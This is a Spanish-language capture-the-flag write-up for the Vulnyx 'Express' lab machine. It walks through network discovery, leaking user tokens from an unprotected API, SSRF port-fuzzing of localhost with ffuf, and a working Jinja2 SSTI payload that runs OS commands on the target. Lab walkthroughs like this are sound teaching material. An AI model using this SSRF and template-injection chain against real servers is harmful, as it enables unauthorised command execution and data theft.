Write-up máquina Express de plataforma [Vulnyx](https://vulnyx.com/#Express)

## Antes de empezar...

Qué vamos a necesitar:

- Máquina atacante kali (virtualbox)
- Máquina victima Vulnyx (ova en virtualbox)
- Red NAT compartida entre ambas máquinas (aislamiento, configuración de virtualbox)

No estoy usando ninguna configuracion especial ni nada.
## Reconocimiento

En este caso la propia máquina víctima nos proporciona su IP en la pantalla de login ya que estamos en un entorno de pruebas. Si no tuvieramos la IP podemos obtenerla mediante varios comandos, alguno de ellos son `arp-scan` y `netdiscover` (usa el protocolo arp para el escaneo), de la siguiente forma:

```bash
sudo netdiscover -i <interfaz-red> -r <rango-IP>
```

Donde:
- La flag `-i` especificará la interfaz de red (en el caso que tengamos varias) por la que se realizará el escaneo
- La flag `-r`especificará el rango de IP sobre el que queremos hacer el escaneo, si esta flag se omite `netdiscover` usará una lista por defecto con los rangos de IPs más conocidos. En nuestro caso el rango debería ser `10.0.0.0/8` ya que estamos en la red NAT compartida con la máquina.

![escaneoNetdiscover](https://github.com/user-attachments/assets/05217bec-030b-4511-9bc3-1367cf578b0d)

```bash
sudo arp-scan --localnet -g -D
```

Donde:
- `--localnet` se usará para que el escaneo se haga en la red local
- `-g` se usará para que no se muestren los duplicados
- `-D` se usará para que nos muestre el round-trip-time al enviar el paquete ARP

![escaneoArpScan](https://github.com/user-attachments/assets/1f106734-e184-4de0-a38d-191ef4d13122)

Con la ip ya podemos realizar el típico escaneo de puertos para obtener que servicios están corriendo en la máquina con la herramienta `nmap`, el comando sería el siguiente:

```bash
nmap -p- --min-rate 2000 -vvv -Pn -n -sS 10.0.2.9 -oN targeted
```

Y la respuesta del escaneo sería la siguiente:

```
Scanning 10.0.2.9 [1 port]
Completed ARP Ping Scan at 12:30, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:30
Scanning 10.0.2.9 [65535 ports]
Discovered open port 80/tcp on 10.0.2.9
Discovered open port 22/tcp on 10.0.2.9
Completed SYN Stealth Scan at 12:30, 0.76s elapsed (65535 total ports)
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.0011s latency).
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:82:B8:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Solo encontramos los puertos 80 (servicio web) y 22 (servicio ssh) abiertos. Continuamos nuestro reconocimiento con otro escaneo más profundo de cada uno de los puertos, con el siguiente comando:

```bash
nmap -sCV -p80,22 10.0.2.9 -oN targeted2
```

Y el segundo reporte sería el siguiente:

```
Nmap scan report for 10.0.2.9
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:82:B8:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En principio nada interesante, la versión de ssh es más o menos reciente (última version a fecha de este commit es 9.9) y el servicio web es Apache httpd 2.4.62.
Al acceder a la IP desde el navegador vemos la página por defecto de Apache, por lo que podemos pensar en que se esta realizando un port forwarding a otra página web. Como estamos en Vulnyx, si añadimos el nombre de la máquina mas la terminación `.nyx` al archivo `/etc/hosts` podemos acceder a la página web que esta corriendo en el servidor apache.

![etcHosts](https://github.com/user-attachments/assets/096e49f7-27a4-4000-8971-fe51b5a820e2)

Y accedemos al dominio desde el navegador veremos la página web hosteada en el servidor.

![paginaExpress](https://github.com/user-attachments/assets/ace51aa2-49e2-44fe-b44c-a3f20b7bd8d0)

Un escaneo de directorios no nos reporta ningún directorio visible. Pero si revisamos el código fuente encontramos un enlace a un archivo con el código de la api del backend!! Vamos a intentar avanzar por esta vía.

Ruta: `http://express.nyx/js/api.js`

![apiCode](https://github.com/user-attachments/assets/96590b18-1363-437d-a2c3-f309a35807f1)

Las dos primeras funciones solamente nos muestran las canciones y los géneros de canciones, pero las dos últimas si parecen tener relevancia. En primer lugar, tenemos una función que nos devolvería los usuarios que tuvieran una `key` especifica como parámetro. Y en segundo lugar tenemos una función que nos devuelve el status de una página web a través de una petición POST a lo que parece una dirección URL de admin `/api/admin/availability`. Como tenemos que empezar por algún sitio, vamos a empezar a enviar diferentes peticiones al primer endpoint para ver si obtenemos información.Vamos a utilizar la herramienta de [Postman](https://www.postman.com/).

![postmanUsers](https://github.com/user-attachments/assets/a81cbc11-da50-48e1-8699-83ef43862e1c)

Si probamos a realizar una petición POST al primer endpoint `/api/users` vemos que nos muestra todos los usuarios creados además de sus tokens!! Esto es una vulnerabilidad grave ya que ha habido una mala configuración de las peticiones del endpoint del lado del servidor. Buscando entre los usuarios vemos que existen diferentes roles, entre ellos hay uno de admin, vamos a seguir investigando para ver si podemos obtener más información.

![adminToken](https://github.com/user-attachments/assets/a67b6763-f414-4640-9103-761cfc95ca9e)

Si miramos ahora el segundo endpoint nos fijamos que nos pide 3 parametros:

- Un id (nos da igual)
- Una url (eso puede ser interesante)
- Un token (el que acabamos de obtener)

```javascript
function checkUrlAvailability() {
    const data = {
        id: 1,
        url: 'http://example.com',
        token: '1234-1234-1234'
    };

    fetch('/api/admin/availability', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
.
.
.
```

Si volvemos a probar con Postman a realizar peticiones comprobaremos que si la url es accesible y el token es válido la petición es satisfactoria.

![postman2EndpointSuccess](https://github.com/user-attachments/assets/a412d043-d25b-4d07-955d-a742b5b5bb3d)

Por lo tanto podemos intentar enviar una petición hacia nuestra máquina para ver si el servidor puede acceder, en mi caso al estar en una red NAT privada no va a funcionar pero la petición se podría hacer. Sabiendo esto podemos decir que esta máquina es vulnerable a **SSRF (Server-Side Request Forgery)** ya que el servidor nos va a devolver la url que le pasemos sin escanearla pudiendo exfiltrar datos del propio servidor en cuestión. Esto lo podemos conseguir de varias formas, una de ellas es realizando peticiones a localhost (127.0.0.1) con [FFUF](https://github.com/ffuf/ffuf).

```bash
ffuf -X POST -H "Content-Type: application/json" \
-d '{"id": 1, "url": "http://127.0.0.1:FUZZ", "token": "4493-3179-0912-0597"}' \
-w /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt \
-u http://express.nyx/api/admin/availability -fc 404,403
```

Con este comando, vamos a decirle a ffuf que queremos hacer una petición POST (flag `-X`) con el contenido del cuerpo de la petición en formato JSON (flag `-H`), donde nuestro body contendrá los parámetros necesarios para realizar la petición al segundo endpoint que vimos (flag `-d`), sin embargo, la url esta vez será la IP de localhost seguido de dos puntos y el parámetro FUZZ para que ffuf pueda sustituir esta cadena por los puertos de la wordlist (wordlist que podemos encontrar en kali o el repo de seclists). Al ejecutar esto obtenemos la siguiente salida:

```
.
.
.
1352                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
445                     [Status: 200, Size: 334, Words: 36, Lines: 7, Duration: 17ms]
1434                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
3000                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
3128                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
6346                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
1521                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
457                     [Status: 200, Size: 334, Words: 36, Lines: 7, Duration: 17ms]
1080                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
1241                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 17ms]
443                     [Status: 200, Size: 334, Words: 36, Lines: 7, Duration: 738ms]
8080                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 1743ms]
1433                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 1746ms]
4001                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 2745ms]
66                      [Status: 200, Size: 333, Words: 36, Lines: 7, Duration: 2747ms]
5800                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 2748ms]
81                      [Status: 200, Size: 333, Words: 36, Lines: 7, Duration: 2749ms]
2301                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 3762ms]
30821                   [Status: 200, Size: 336, Words: 36, Lines: 7, Duration: 3758ms]
8888                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 3764ms]
5801                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 3767ms]
1944                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 3768ms]
5432                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 3769ms]
1100                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 3770ms]
4000                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 3771ms]
5802                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4787ms]
8000                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4790ms]
7002                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4791ms]
7001                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4792ms]
8443                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4794ms]
5000                    [Status: 200, Size: 300, Words: 39, Lines: 7, Duration: 4796ms]
80                      [Status: 200, Size: 11239, Words: 3439, Lines: 7, Duration: 4798ms]
4002                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4799ms]
6347                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4800ms]
4100                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4802ms]
3306                    [Status: 200, Size: 335, Words: 36, Lines: 7, Duration: 4804ms]
.
.
.
```

Nos salen bastantes puertos aunque la gran mayoría tiene el parámetro `Words` igual, por lo que con la flag `-fw 36` vamos a filtrar por aquellos cuya respuesta sea distinta de 36. Ahora ya solo nos salen 4 puertos.

```
...
22                      [Status: 200, Size: 175, Words: 16, Lines: 7, Duration: 1205ms]
80                      [Status: 200, Size: 11239, Words: 3439, Lines: 7, Duration: 3944ms]
5000                    [Status: 200, Size: 300, Words: 39, Lines: 7, Duration: 107ms]
9000                    [Status: 200, Size: 279, Words: 50, Lines: 7, Duration: 54ms]
...
```
El puerto 5000 parece ser hacia donde van las peticiones de la api (si probamos `http:127.0.0.1:5000/api/music/songs` en la url nos devolvera las canciones), si probamos a hacer una petición al puerto 9000 nos encontramos con lo siguiente:

![port9000Response](https://github.com/user-attachments/assets/17c23438-1b73-4bb8-acbf-245fa10e4b29)

A simple vista parece un formulario que hace una petición a la ruta `/username` con un parámetro name, si probamos a meter cualquier cosa.

![usernamePath9000](https://github.com/user-attachments/assets/fc8b6d6c-d201-46ea-bad2-15c1db5994be)

Solo obtenemos un saludo más el parámetro que hemos introducido. Aquí la verdad que ya estaba un poco perdido y me puse a mirar uno de los write-ups que habia en Vulnyx donde descubrí la vulnerabilidad que había que explotar, la vulnerabilidad es **SSTI (Server-side template injection)**. Esta vulnerabilidad consiste en meter un payload concreto para intentar descubrir el template que se esta usando en el servidor, es un ataque que no suele ser muy frecuente si no lo estás buscando activamente (digamos que es un ataque un tanto concreto). Consultando el siguiente enlace pude entender mejor de que iba el ataque y como realizarlo [STTI PortSwigger](https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack), además el siguiente diagrama me pareció bastante intuitivo para obtener el template que se estaba usando.

![template-decision-tree](https://github.com/user-attachments/assets/31c4b960-3c9f-4b22-9b80-2f133d45a069)

Probando los payloads arriba mencionados y comprobando el output con POSTMAN obtenemos que el template usado es Jinja2.

![sttiTemplate](https://github.com/user-attachments/assets/8ef21774-f12e-436d-985c-976a3f81b59c)

Con esto ya tenía de nuevo un hilo por el que tirar y poder continuar con la máquina. Por lo tanto, me puse a investigar como aprovechar esta vulnerabilidad para poder ejecutar comandos en la máquina y me encontré la siguiente [página web](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/), donde explican qué es Jinja2 y como formar un payload para ejecutar un RCE. El payload a meter en el parámetro `name` sería el siguiente:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('<command>').read()}}
```
donde `command`sería el comando que queremos que se ejecute en la máquina víctima. Si probamos con `id` o `whoami` observamos que somos el usuario administrador.

>Payload
>```json
>{
>    "id": 1,
>    "url": "http://127.0.0.1:9000/username?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
>    "token": "4493-3179-0912-0597"
>}
>```

![IDCommand](https://github.com/user-attachments/assets/d3e83192-175f-41c1-b024-cda223d8d126)

Con esto podríamos leer las flags de usuario y administrador o exfiltrar cualquier otra información que quisieramos quedando la máquina totalmente vulnerada. Espero que se haya comprendido el proceso y las vulnerabilidades, hasta la próxima y que el hacking os acompañe!!
